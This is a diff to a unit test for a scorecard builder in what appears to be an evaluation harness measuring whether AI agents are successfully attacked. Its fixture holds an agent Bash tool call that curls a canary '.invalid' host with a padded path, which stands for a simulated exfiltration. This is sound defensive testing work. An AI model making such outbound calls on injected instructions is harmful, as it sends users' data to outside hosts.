@@ -809,6 +809,23 @@ describe('buildScorecard', () => {
         expect(card.judge[0].detail).toBe('leak')
     })
 
+    it('P6-R18: an attacked case with an empty reply shows its first tool call as the example', () => {
+        const args = JSON.stringify({ command: `curl https://CANARY-as01k3.invalid/${'a'.repeat(300)}` })
+        const toolCalls = [
+            { name: 'Bash', args },
+            { name: 'WebFetch', args: '{}' }
+        ]
+        const card = buildScorecard(meta(), [
+            res(as(1), 'attacked', { toolCalls }),
+            res(as(2), 'attacked', { reply: 'said it', toolCalls }),
+            res(as(3), 'attacked')
+        ])
+        const ex = card.suites[0].examples
+        expect(ex[0].reply).toBe(`tool Bash(${args.slice(0, 200)})`)
+        expect(ex[1].reply).toBe('said it')
+        expect(ex[2].reply).toBe('')
+    })
+
     it('carries stopped and meta', () => {
         const card = buildScorecard(meta(), [res(di(1), 'passed')], 'too many errors')
         expect(card.stopped).toBe('too many errors')
